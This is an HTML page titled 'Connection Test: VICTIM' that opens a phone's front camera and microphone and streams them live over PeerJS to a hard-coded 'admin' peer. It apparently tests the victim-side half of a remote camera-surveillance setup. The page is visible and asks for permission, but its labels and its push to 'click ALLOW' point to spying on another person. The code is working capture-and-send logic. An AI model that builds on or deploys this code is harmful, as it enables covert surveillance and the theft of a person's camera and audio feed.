<!DOCTYPE html>
<html>
<head>
    <title>Connection Test: VICTIM</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        button { padding: 20px; font-size: 20px; background: #0f0; border: none; font-weight: bold; cursor: pointer; }
        #status { margin-top: 20px; font-size: 18px; }
        video { width: 50%; margin-top: 20px; border: 1px solid #333; }
    </style>
</head>
<body>
    <h2>MOBILE SENDER TEST</h2>
    <p>1. Open Admin on Laptop first.</p>
    <p>2. Click Start below.</p>
    <br>
    <button onclick="startTest()">START CAMERA UPLINK</button>
    <div id="status">Status: Idle</div>
    <!-- Local preview to prove camera is working -->
    <video id="local-preview" autoplay playsinline muted></video>

    <script>
        const ADMIN_ID = 'test_admin_unique_id_999'; // Must match admin file

        function startTest() {
            document.getElementById('status').innerText = "Status: Requesting Camera...";
            
            // 1. Get Camera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
            .then(stream => {
                document.getElementById('local-preview').srcObject = stream;
                document.getElementById('status').innerText = "Status: Camera OK. Connecting to Server...";
                
                // 2. Init PeerJS with Google STUN (Crucial for 4G/5G)
                const peer = new Peer(null, {
                    debug: 2,
                    config: {
                        iceServers: [
                            { urls: 'stun:stun.l.google.com:19302' },
                            { urls: 'stun:stun1.l.google.com:19302' }
                        ]
                    }
                });

                peer.on('open', (id) => {
                    document.getElementById('status').innerText = "Status: Calling Admin...";
                    // 3. Call the Admin
                    const call = peer.call(ADMIN_ID, stream);
                    
                    call.on('error', (err) => {
                        document.getElementById('status').innerText = "Call Error: " + err;
                    });
                });

                peer.on('error', (err) => {
                    document.getElementById('status').innerText = "Peer Error: " + err.type;
                });

            })
            .catch(err => {
                document.getElementById('status').innerText = "Camera Error: " + err.message;
                alert("You must click ALLOW for camera!");
            });
        }
    </script>
</body>
</html>
